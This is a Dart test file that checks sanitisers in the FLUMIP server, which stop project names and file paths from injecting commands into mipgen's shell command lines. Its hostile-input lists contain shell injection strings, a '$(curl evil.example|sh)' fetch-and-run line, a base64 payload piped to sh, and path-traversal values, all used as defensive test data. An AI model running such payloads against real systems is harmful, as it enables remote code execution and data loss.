import 'package:flumip_server/src/generated/protocol.dart';
import 'package:flumip_server/src/services/mipgen_service.dart';
import 'package:test/test.dart';

/// What FLUMIP lets through to mipgen's command line.
///
/// ⚠️ **Why these are security tests.** mipgen builds shell command lines by
/// string concatenation and runs them with `system()`: `-project_name`, the
/// reference, the SNP file and the TRF helper all end up in one, unquoted. A
/// project's name is free text from whoever created it — an anonymous guest on
/// a public instance. Whatever these two functions let through is, in effect,
/// typed into a shell as the service user.
void main() {
  /// Everything a POSIX shell gives a meaning to, and the two characters that
  /// let a file name leave its directory.
  final dangerous = RegExp(r'''[^A-Za-z0-9_-]''');

  group('mipgenPrefixOf', () {
    test('leaves a name that was already safe alone', () {
      // So the result files of every project that could ever have run keep
      // their names.
      for (final name in ['demo', 'BRCA_panel-v2', 'a', 'Panel2026']) {
        expect(mipgenPrefixOf(name), name);
      }
    });

    test('takes the shell out of a name', () {
      expect(mipgenPrefixOf('x;id>&2;#'), 'x_id_2');
      expect(mipgenPrefixOf(r'a$(reboot)b'), 'a_reboot_b');
      expect(mipgenPrefixOf('a`id`b'), 'a_id_b');
      expect(mipgenPrefixOf('a|b&&c||d'), 'a_b_c_d');
      expect(mipgenPrefixOf("a'b\"c\\d"), 'a_b_c_d');
      expect(mipgenPrefixOf('a\nb\tc\r\nd'), 'a_b_c_d');
      expect(mipgenPrefixOf('a > /etc/passwd'), 'a_etc_passwd');
    });

    test('cannot leave the project folder', () {
      // mipgen opens `<prefix>.progress.txt` relative to its working directory.
      expect(mipgenPrefixOf('../../../../var/www/x'), 'var_www_x');
      expect(mipgenPrefixOf('/tmp/x'), 'tmp_x');
      expect(mipgenPrefixOf('..'), mipgenPrefixFallback);
      expect(mipgenPrefixOf('a/../b'), 'a_b');
    });

    test('never starts with a dash', () {
      // mipgen's parser takes any argument starting with `-` for an option
      // name, so `-file_of_parameters` as a value would be read as one.
      expect(mipgenPrefixOf('-file_of_parameters'), 'file_of_parameters');
      expect(mipgenPrefixOf('--x'), 'x');
      expect(mipgenPrefixOf(' -x'), 'x');
    });

    test('keeps what it can of an ordinary name', () {
      expect(mipgenPrefixOf('My panel (v2)'), 'My_panel_v2');
      expect(mipgenPrefixOf('Müller Panel'), 'M_ller_Panel');
      expect(mipgenPrefixOf('  spaced  '), 'spaced');
    });

    test('is never empty', () {
      for (final name in ['', ' ', ';', '···', '日本語', '-', '_', '-_-']) {
        expect(mipgenPrefixOf(name), mipgenPrefixFallback, reason: '"$name"');
      }
    });

    test('is never longer than a file name can take', () {
      expect(mipgenPrefixOf('a' * 500), 'a' * mipgenPrefixMaxLength);
      // The cut must not leave a separator dangling at the end.
      final cutAtSeparator = '${'a' * (mipgenPrefixMaxLength - 1)} bcd';
      expect(mipgenPrefixOf(cutAtSeparator), 'a' * (mipgenPrefixMaxLength - 1));
    });

    test('whatever goes in, only safe characters come out', () {
      final hostile = [
        for (var c = 0; c < 0x250; c++) 'a${String.fromCharCode(c)}b',
        r'$(curl evil.example|sh)',
        'x;echo cGF5bG9hZA==|base64 -d|sh;#',
        '  \u0000',
        r'${IFS}',
        '~root',
        '*?[a]{b,c}',
        '!history',
        'a=b',
      ];
      for (final name in hostile) {
        final prefix = mipgenPrefixOf(name);
        expect(dangerous.hasMatch(prefix), isFalse, reason: '"$name"');
        expect(prefix, isNotEmpty, reason: '"$name"');
        expect(prefix.startsWith('-'), isFalse, reason: '"$name"');
        expect(
          prefix.length,
          lessThanOrEqualTo(mipgenPrefixMaxLength),
          reason: '"$name"',
        );
      }
    });

    test('names the design file with the prefix, not the name', () {
      final path = pickedMipsPathOf(
        Settings(projectDir: '/p'),
        Project(name: '../../x;id', folderName: 'folder', options: 1),
      );
      expect(path, '/p/folder/x_id.picked_mips.txt');
    });
  });

  group('isMipgenSafePath', () {
    test('accepts the paths a server really has', () {
      for (final path in [
        '/opt/flumip/data/human/hg38/fa/hg38.fa',
        '/opt/flumip/data/custom_snp/user/12/my-set_v2.vcf.gz',
        '/opt/flumip/tools/mipgen-trf',
        '/mnt/lab@site/genomes+extra/hs1.fa',
        'relative/hg38.fa',
      ]) {
        expect(isMipgenSafePath(path), isTrue, reason: path);
      }
    });

    test('refuses anything a shell would read as more than a word', () {
      for (final path in [
        '',
        '/data/hg38.fa;id;#',
        '/data/my genomes/hg38.fa',
        r'/data/$(id)/hg38.fa',
        '/data/`id`/hg38.fa',
        '/data/hg38.fa|sh',
        '/data/hg38.fa&',
        '/data/hg38.fa>out',
        '/data/hg38.fa<in',
        "/data/it's/hg38.fa",
        '/data/"q"/hg38.fa',
        r'/data/back\slash/hg38.fa',
        '/data/new\nline/hg38.fa',
        '/data/*/hg38.fa',
        '/data/?/hg38.fa',
        '/data/[a]/hg38.fa',
        '/data/{a,b}/hg38.fa',
        '/data/(x)/hg38.fa',
        '/data/#/hg38.fa',
        '/data/!/hg38.fa',
        '~/hg38.fa',
        '/data/ü/hg38.fa',
      ]) {
        expect(isMipgenSafePath(path), isFalse, reason: path);
      }
    });

    test('refuses a path mipgen would read as an option', () {
      expect(isMipgenSafePath('-file_of_parameters'), isFalse);
      expect(isMipgenSafePath('-bwa'), isFalse);
    });
  });
}
